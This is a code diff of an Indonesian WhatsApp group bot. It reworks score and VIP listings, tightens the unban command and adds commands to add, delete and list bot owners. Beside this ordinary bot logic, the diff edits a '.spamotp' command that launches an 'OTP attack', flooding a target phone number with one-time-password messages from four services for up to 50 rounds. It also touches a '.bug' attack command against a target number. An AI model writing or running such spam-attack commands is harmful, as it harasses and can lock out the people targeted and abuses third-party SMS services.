@@ -2987,7 +3153,7 @@ if (text.trim() === '.skor') {
     } else if (isVIP(sender, roomKey) || isVIP(sender, 'vip-pribadi')) {
         status = "💎 VIP";
     } else {
-        status = "👤 Non-VIP";
+        status = "👤 User";
     }
 
     // Kirim hasilnya
@@ -3059,18 +3225,17 @@ if (text.startsWith('.allskor')) {
   }, { quoted: msg });
 }
 
-
 if (body.startsWith('.listskor')) {
   if (!isVIP(sender, from) && !hasTemporaryFeature(sender, 'listskor')) {
     await sock.sendMessage(from, {
-      text: '❌ Perintah hanya bisa digunakan *Owner* dan *VIP*.'
+      text: '❌ Hanya owner & VIP'
     }, { quoted: msg });
     return;
   }
 
   if (!isGroup) {
     await sock.sendMessage(from, {
-      text: '❌ Perintah ini hanya bisa digunakan di dalam grup.'
+      text: '❌ Grup only'
     }, { quoted: msg });
     return;
   }
@@ -3085,12 +3250,12 @@ if (body.startsWith('.listskor')) {
 
   if (skorKeys.length === 0) {
     await sock.sendMessage(from, {
-      text: '📊 Belum ada data skor/rank.'
+      text: '📭 Belum ada skor'
     }, { quoted: msg });
     return;
   }
 
-  // Urutkan: Level dulu → Skor
+  // Urutkan
   const sorted = skorKeys.sort((a, b) => {
     const lvlA = rankGrup[a]?.level || 1;
     const lvlB = rankGrup[b]?.level || 1;
@@ -3098,24 +3263,27 @@ if (body.startsWith('.listskor')) {
     return (skorGrup[b] || 0) - (skorGrup[a] || 0);
   });
 
-  let teks = `╔══ 📊 *DAFTAR SKOR & LEVEL* 📊 ══╗\n`;
+  let teks = `📊 List Skor (${sorted.length}):\n\n`;
 
   const normOwner = normalizeJid(OWNER_NUMBER);
+  
+  // Owner di atas
   if (groupMembers.includes(normOwner)) {
     const skorOwner = skorGrup[normOwner] || 0;
     const lvlOwner = rankGrup[normOwner]?.level || 1;
-    teks += `║ 👑 Owner : @${normOwner.split('@')[0]} → *${skorOwner} poin* | Lv.${lvlOwner}\n`;
+    teks += `👑 @${normOwner.split('@')[0]}\n`;
+    teks += `   └ ${skorOwner} poin | Lv.${lvlOwner}\n\n`;
   }
 
+  // Member lain
   let count = 1;
   for (const jid of sorted) {
     if (jid === normOwner) continue;
     const skor = skorGrup[jid] || 0;
     const lvl = rankGrup[jid]?.level || 1;
-    teks += `║ ${count++}. @${jid.split('@')[0]} → *${skor} poin* | Lv.${lvl}\n`;
+    teks += `${count++}. @${jid.split('@')[0]}\n`;
+    teks += `   └ ${skor} poin | Lv.${lvl}\n`;
   }
-
-  teks += `╚═════════════════════════╝`;
 
   await sock.sendMessage(from, {
     text: teks,
@@ -3126,14 +3294,14 @@ if (body.startsWith('.listskor')) {
 if (body.startsWith('.listvip')) {
   if (!isVIP(sender, from) && !hasTemporaryFeature(sender, 'listvip')) {
     await sock.sendMessage(from, {
-      text: '❌ Perintah hanya bisa digunakan *Owner* dan *VIP*.'
+      text: '❌ Hanya owner & VIP'
     }, { quoted: msg });
     return;
   }
 
   if (!isGroup) {
     await sock.sendMessage(from, {
-      text: '❌ Perintah hanya bisa digunakan di grup.' 
+      text: '❌ Grup only'
     }, { quoted: msg });
     return;
   }
@@ -3142,25 +3310,22 @@ if (body.startsWith('.listvip')) {
   const groupMembers = metadata.participants.map(p => normalizeJid(p.id));
 
   const normOwner = normalizeJid(OWNER_NUMBER);
-
   const allVIP = (vipList[from] || []).filter(jid => groupMembers.includes(jid));
   const vipLain = allVIP.filter(jid => jid !== normOwner);
 
-  let teks = `╔══ 🎖️ *DAFTAR VIP* 🎖️ ══╗\n`;
+  let teks = `🎖️ List VIP (${allVIP.length}):\n\n`;
 
   if (groupMembers.includes(normOwner)) {
-    teks += `║ 👑 Owner : @${normOwner.split('@')[0]}\n`;
+    teks += `👑 @${normOwner.split('@')[0]}\n\n`;
   }
 
   if (vipLain.length === 0) {
-    teks += `║\n║ Belum ada VIP di grup ini.\n`;
+    teks += `📭 Belum ada VIP lain`;
   } else {
     vipLain.forEach((jid, i) => {
-      teks += `║ ${i + 1}. @${jid.split('@')[0]}\n`;
+      teks += `${i + 1}. @${jid.split('@')[0]}\n`;
     });
   }
-
-  teks += `╚═══════════════════╝`;
 
   const mentions = [...vipLain];
   if (!mentions.includes(normOwner) && groupMembers.includes(normOwner)) {
@@ -3424,7 +3589,7 @@ if (body.startsWith('.clearvip') && isGroup) {
 if (body.startsWith('.ban')) {
   const args = body.trim().split(/\s+/);
 
-  // 💬 MODEE 1: Chat pribadi (Owner saja)
+  // 💬 MODE 1: Chat pribadi (Owner saja)
   if (!isGroup && isOwner(sender)) {
     if (!args[1]) {
       await sock.sendMessage(from, { text: '❌ Format salah!\nGunakan: *.ban 62xxxx*' }, { quoted: msg });
@@ -3523,7 +3688,7 @@ if (body.startsWith('.unban')) {
     saveBanned();
 
     // Notifikasi korban (karena ini ban-pribadi)
-    try { await sock.sendMessage(target, { text: '✅ Kamu telah di-unban oleh Owner dan bisa menggunakan bot pribadi lagi.' }); } catch {}
+    try { await sock.sendMessage(target, { text: '✅ Kamu telah di-unban oleh Owner dan bisa menggunakan bot lagi.' }); } catch {}
 
     await sock.sendMessage(from, { text: `✅ @${target.split('@')[0]} berhasil di-unban.`, mentions: [target] }, { quoted: msg });
     return;
@@ -3531,8 +3696,8 @@ if (body.startsWith('.unban')) {
 
   // 👥 MODE 2: Grup (Owner & VIP bisa)
   if (isGroup) {
-    if (!isOwner(sender) && !isVIP(sender, from)) {
-      await sock.sendMessage(from, { text: '❌ Hanya VIP atau Owner yang bisa menggunakan perintah ini di grup.' }, { quoted: msg });
+    if (!isOwner(sender)) {
+      await sock.sendMessage(from, { text: '❌ Hanya Owner yang bisa menggunakan perintah ini di grup.' }, { quoted: msg });
       return;
     }
 
@@ -3546,7 +3711,7 @@ if (body.startsWith('.unban')) {
     const groupId = 'ban-grup';
 
     if (!bannedUsers[groupId] || !bannedUsers[groupId][target]) {
-      await sock.sendMessage(from, { text: `⚠️ @${target.split('@')[0]} tidak dibanned (mode grup).`, mentions: [target] }, { quoted: msg });
+      await sock.sendMessage(from, { text: `⚠️ @${target.split('@')[0]} tidak dibanned.`, mentions: [target] }, { quoted: msg });
       return;
     }
 
@@ -3554,16 +3719,188 @@ if (body.startsWith('.unban')) {
     saveBanned();
 
     // Jangan kirim pesan pribadi ke korban (sesuai permintaan)
-    await sock.sendMessage(from, { text: `✅ @${target.split('@')[0]} berhasil di-unban (mode grup).`, mentions: [target] }, { quoted: msg });
+    await sock.sendMessage(from, { text: `✅ @${target.split('@')[0]} berhasil di-unban.`, mentions: [target] }, { quoted: msg });
     return;
   }
 
   // 🚫 Selain dua mode di atas
-  await sock.sendMessage(from, { text: '❌ Perintah ini hanya bisa digunakan oleh Owner di pribadi atau VIP/Owner di grup.' }, { quoted: msg });
+  await sock.sendMessage(from, { text: '❌ Perintah ini hanya bisa digunakan oleh Owner!' }, { quoted: msg });
 }
 
-
-
+// 🎯 .ADDOWNER - Tambah owner (SIMPLE VERSION)
+if (body.startsWith('.addowner')) {
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { 
+            text: font('❌ ʜᴀɴʏᴀ ᴏᴡɴᴇʀ'),
+            mentions: [sender]
+        });
+        return;
+    }
+    
+    const args = body.split(' ');
+    
+    // Format: .addowner @tag NAMA
+    if (args.length < 3) {
+        await sock.sendMessage(from, { 
+            text: font('⚠️ ᴜꜱᴀɢᴇ: .ᴀᴅᴅᴏᴡɴᴇʀ @ᴛᴀɢ ɴᴀᴍᴀ')
+        });
+        return;
+    }
+    
+    let targetAlias = '';
+    let targetName = '';
+    
+    // Jika tag orang
+    if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
+        targetAlias = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
+        targetName = args.slice(2).join(' ').trim();
+    } else {
+        await sock.sendMessage(from, { 
+            text: font('⚠️ ᴛᴀɢ ᴏʀᴀɴɢɴʏᴀ!')
+        });
+        return;
+    }
+    
+    if (!targetName) {
+        await sock.sendMessage(from, { 
+            text: font('⚠️ ʜᴀʀᴜꜱ ᴋᴀꜱɪʜ ɴᴀᴍᴀ!')
+        });
+        return;
+    }
+    
+    // 🚨 CEK: Apakah sudah owner?
+    for (const [id, data] of Object.entries(ownersData)) {
+        if (data.alias === targetAlias) {
+            await sock.sendMessage(from, { 
+                text: font(`❌ ꜱᴜᴅᴀʜ ᴍᴇɴᴊᴀᴅɪ ᴏᴡɴᴇʀ!`),
+                quoted: msg
+            });
+            return;
+        }
+    }
+    
+    // Buat ID dari nama
+    const nameId = targetName.toLowerCase().replace(/\s+/g, '_').replace(/[^a-z0-9_]/g, '');
+    
+    // Simpan
+    ownersData[nameId] = {
+        name: targetName,
+        alias: targetAlias,
+        addedBy: sender.split('@')[0],
+        addedAt: new Date().toISOString()
+    };
+    
+    saveOwnersData();
+    
+    await sock.sendMessage(from, { 
+        text: font(`✅ ${targetName} ʙᴇʀʜᴀꜱɪʟ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ`)
+    });
+    
+    return;
+}
+// 🎯 .DELLOWNER - Hapus owner (BLOCK untuk owner asli)
+if (body.startsWith('.dellowner')) {
+    if (!isOwner(sender)) {
+        await sock.sendMessage(from, { 
+            text: font('❌ ʜᴀɴʏᴀ ᴏᴡɴᴇʀ'),
+            mentions: [sender]
+        });
+        return;
+    }
+    
+    const args = body.split(' ');
+    if (args.length < 2) {
+        await sock.sendMessage(from, { 
+            text: font('⚠️ ᴜꜱᴀɢᴇ: .ᴅᴇʟʟᴏᴡɴᴇʀ ɴᴀᴍᴀ')
+        });
+        return;
+    }
+    
+    const inputName = args.slice(1).join(' ').trim();
+    
+    // Cari owner
+    let foundKey = null;
+    let foundData = null;
+    
+    for (const [key, data] of Object.entries(ownersData)) {
+        if (data.name && data.name.toLowerCase() === inputName.toLowerCase()) {
+            foundKey = key;
+            foundData = data;
+            break;
+        }
+    }
+    
+    if (!foundKey) {
+        await sock.sendMessage(from, { 
+            text: font(`❌ ᴏᴡɴᴇʀ "${inputName}" ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ`)
+        });
+        return;
+    }
+    
+    // 🚨 CEK JIKA INI OWNER ASLI
+    if (foundData.alias && foundData.alias.includes('6283836348226')) {
+        await sock.sendMessage(from, { 
+            text: font('❌ ʏᴀᴋᴀʟɪ ᴏᴡɴᴇʀ ᴀꜱʟɪ ᴍᴀᴜ ᴅɪʜᴀᴘᴜꜱ ʟᴜ ɢʙꜱᴀ ʙᴇɢᴏ!')
+        });
+        return;
+    }
+    
+    // Hapus owner
+    const ownerName = foundData.name;
+    delete ownersData[foundKey];
+    saveOwnersData();
+    
+    await sock.sendMessage(from, { 
+        text: font(`❌ ${ownerName} ʙᴇʀʜᴀꜱɪʟ ᴅɪʜᴀᴘᴜꜱ`)
+    });
+    
+    return;
+}
+// 🎯 .LISTOWNER - List owner
+if (body === '.listowner') {
+    // Owner utama
+    const mainOwner = {
+        name: '👑',
+        number: '6283836348226'
+    };
+    
+    // Owners dari file
+    const additionalOwners = [];
+    for (const [id, data] of Object.entries(ownersData)) {
+        additionalOwners.push({
+            name: data.name || 'Unknown'
+        });
+    }
+    
+    // Gabungkan semua owner
+    const allOwners = [mainOwner, ...additionalOwners];
+    
+    if (allOwners.length === 0) {
+        await sock.sendMessage(from, { 
+            text: '📭 Belum ada owner'
+        });
+        return;
+    }
+    
+    // Buat list
+    let response = `👑 List Owner (${allOwners.length}):\n\n`;
+    const mentions = [];
+    
+    // Owner asli di-tag
+    mentions.push('6283836348226@s.whatsapp.net');
+    response += `1. @${mainOwner.number} ${mainOwner.name}\n`;
+    
+    // Owner lain
+    additionalOwners.forEach((owner, index) => {
+        response += `${index + 2}. ${owner.name}\n`;
+    });
+    
+    await sock.sendMessage(from, { 
+        text: response,
+        mentions: mentions
+    });
+    return;
+}
 // 🔒 KICK – Hanya untuk VIP
 if (text.startsWith('.kick')) {
 
@@ -5992,7 +6329,7 @@ if (body.startsWith('.bug')) {
         // Cek hasilnya, kalo array kosong berarti ga ada
         if (!Array.isArray(waCheck) || waCheck.length === 0 || !waCheck[0]?.exists) {
             await sock.sendMessage(from, { 
-                text: `⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: ${targetNum} 𝗧𝗜𝗗𝗔𝗞 𝗧𝗘𝗥𝗗𝗔𝗙𝗧𝗔𝗥 𝗗𝗜 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣\nNomor tidak valid atau tidak terdaftar.`
+                text: `⚠️ 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: ${targetNum} 𝗧𝗜𝗗𝗔𝗞 𝗧𝗘𝗥𝗗𝗔𝗙𝗧𝗔𝗥 𝗗𝗜 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣.`
             });
             return;
         }
@@ -6037,7 +6374,6 @@ if (body.startsWith('.bug')) {
     
     return;
 }
-
 // Command handler
 if (body.startsWith('.spamotp')) {
     const args = body.trim().split(' ');
@@ -6061,7 +6397,7 @@ if (body.startsWith('.spamotp')) {
 
     // Validate
     if (!targetNum) {
-        await sock.sendMessage(from, { text: '❌ *INVALID TARGET*\nFormat: 08xxx atau 62xxx' });
+        await sock.sendMessage(from, { text: '❌ INVALID TARGET\nFormat: 08xxx atau 62xxx' });
         return;
     }
 
@@ -6079,51 +6415,44 @@ if (body.startsWith('.spamotp')) {
     
     if (count > 50) {
         count = 50;
-        await sock.sendMessage(from, { text: '⚠️ *LIMIT:* Max 50 rounds, auto-adjusted' });
+        await sock.sendMessage(from, { text: '⚠️ LIMIT: Max 50 rounds' });
     }
 
-    // Initialize spammer if not exists
+    // Initialize spammer
     if (!realSpammer) {
         realSpammer = new RealOTPSpammer(sock);
-        await sock.sendMessage(from, { text: '⚡ *REAL OTP SPAMMER*\n4 WORKING SERVICES READY!' });
     }
 
-    // Check if already spamming this target
+    // Check if already spamming
     const activeJobs = realSpammer.getActiveJobs();
     const existingJob = activeJobs.find(job => job.target === targetNum);
     
     if (existingJob) {
         await sock.sendMessage(from, { 
-            text: `⚠️ *TARGET ALREADY BEING SPAMMED*\n\nTarget: ${targetNum}\nRounds: ${existingJob.sent + existingJob.failed}/${existingJob.count}\n\nWait for current attack to finish.`
+            text: `⚠️ TARGET SEDANG DI SPAM\n\nTarget: ${targetNum}\nProgress: ${existingJob.sent + existingJob.failed}/${existingJob.count}`
         });
         return;
     }
 
-    // Start the attack
+    // Start attack
     await sock.sendMessage(from, { 
-        text: `🎯 *LAUNCHING OTP ATTACK*\n\n📱 Target: ${targetNum}\n🎯 Rounds: ${count}\n⚡ Services: 4 WORKING\n\n*ESTIMATED TIME:* ${count * 10} seconds\n\n*STARTING NOW...*`
+        text: `🎯 LAUNCHING OTP ATTACK\n\n📱 Target: ${targetNum}\n🎯 Rounds: ${count}\n⚡ Services: 4`
     });
 
     // Start spam in background
     setTimeout(async () => {
         try {
-            const result = await realSpammer.startSpamOTP(targetNum, count, from);
+            await realSpammer.startSpamOTP(targetNum, count, from);
             
-            // Final report
+        } catch {
             await sock.sendMessage(from, {
-                text: `📊 *FINAL REPORT*\n\n✅ Successful OTPs: ${result.sent}\n❌ Failed: ${result.failed}\n📈 Total Sent: ${result.total}\n\n*TARGET:* ${targetNum}\n*STATUS:* COMPLETED`
-            });
-            
-        } catch (error) {
-            await sock.sendMessage(from, {
-                text: `💀 *CRITICAL ERROR*\n\n${error.message}\n\nAttack terminated.`
+                text: `❌ ERROR\nAttack stopped.`
             });
         }
     }, 1000);
     
     return;
 }
-
 
 // 📝 SET NAMA GRUP – Semua member bisa
 if (text.startsWith('.setnamagc')) {
@@ -8929,6 +9258,9 @@ ${readmore}╭─〔 🤖 ʙᴏᴛ ᴊᴀʀʀ ᴍᴇɴᴜ 〕─╮
 │ .ᴀʟʟᴠɪᴘ
 │ .ᴄʟᴇᴀʀᴠɪᴘ
 │ .ꜱᴇᴛᴏꜰꜰ
+│ .ᴀᴅᴅᴏᴡɴᴇʀ
+│ .ᴅᴇʟʟᴏᴡɴᴇʀ
+│ .ʟɪꜱᴛᴏᴡɴᴇʀ
 │
 ├─ 〔 ⚙️ ʙᴏᴛ ᴄᴏɴᴛʀᴏʟ 〕
 │ .ᴏɴ
